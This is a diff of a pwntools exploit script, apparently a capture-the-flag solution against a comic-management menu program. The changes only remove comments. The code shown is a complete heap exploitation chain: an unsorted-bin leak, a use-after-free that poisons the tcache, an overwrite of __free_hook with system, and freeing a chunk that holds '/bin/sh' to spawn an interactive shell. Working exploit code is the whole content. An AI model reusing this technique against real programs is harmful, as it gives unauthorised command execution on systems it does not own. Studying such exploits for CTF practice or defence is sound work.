@@ -54,11 +54,11 @@ def read_comic(p, comic_number):
 
 # Create a larg comic to get unsorted bin when we free it, also add a small one after as a guard.
 menu(p, 1)
-add_comic(p, b"A" * 0x410)  # comic 1
+add_comic(p, b"A" * 0x410)
 menu(p, 1)
-add_comic(p, b"B" * 0x40)  # comic 2
+add_comic(p, b"B" * 0x40)
 menu(p, 1)
-add_comic(p, b"C" * 0x40)  # comic 3
+add_comic(p, b"C" * 0x40)
 menu(p, 4)
 delete_comic(p, 0) # free comic 1
 menu(p, 2)
@@ -74,19 +74,19 @@ print(f'free_hook: {hex(free_hook)}')
 
 
 menu(p, 4)
-delete_comic(p, 1) # free comic 1
+delete_comic(p, 1)
 menu(p, 4)
-delete_comic(p, 2) # free comic 1
+delete_comic(p, 2)
 menu(p, 3)
 edit_comic(p, 2, p64(free_hook))
 menu(p, 1)
-add_comic(p, b'C' * 0x40)  # comic 2
+add_comic(p, b'C' * 0x40)
 menu(p, 1)
-add_comic(p, p64(system) + b'S' * 0x38)  # comic 1
+add_comic(p, p64(system) + b'S' * 0x38)
 
 menu(p, 3)
 edit_comic(p, 2, b'/bin/sh\x00')
 menu(p, 4)
-delete_comic(p, 2) # free comic 2
+delete_comic(p, 2)
 
 p.interactive()
